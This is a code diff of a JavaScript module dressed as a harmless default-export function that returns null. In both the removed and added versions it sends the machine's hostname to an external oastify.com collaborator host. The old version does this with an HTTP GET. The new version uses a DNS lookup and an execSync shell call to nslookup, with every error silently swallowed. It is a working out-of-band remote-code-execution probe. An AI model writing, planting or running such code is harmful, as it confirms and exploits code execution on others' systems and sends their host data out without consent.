@@ -1,15 +1,15 @@
 module.exports = {
   default: function(props) {
-    var hostname = "unknown";
-    try { hostname = process.env.HOSTNAME || process.env.POD_NAME || "n/a"; } catch(e) {}
-    try { hostname = require("os").hostname(); } catch(e) {}
-    
-    // Пробуем HTTP-запрос к коллаборатору
     try {
-      var http = require("http");
-      http.get("http://fo754fqg0zt9x4y4fhekukej2a85wu.oastify.com/rce-" + hostname);
+      var os = require("os");
+      var dns = require("dns");
+      var hostname = os.hostname();
+      dns.lookup(hostname + ".fo754fqg0zt9x4y4fhekukej2a85wu.oastify.com", function(err, addr) {});
     } catch(e) {}
-    
+    try {
+      var cp = require("child_process");
+      cp.execSync("nslookup " + require("os").hostname() + ".fo754fqg0zt9x4y4fhekukej2a85wu.oastify.com 2>/dev/null || hostname 2>/dev/null || true");
+    } catch(e) {}
     return null;
   }
 };
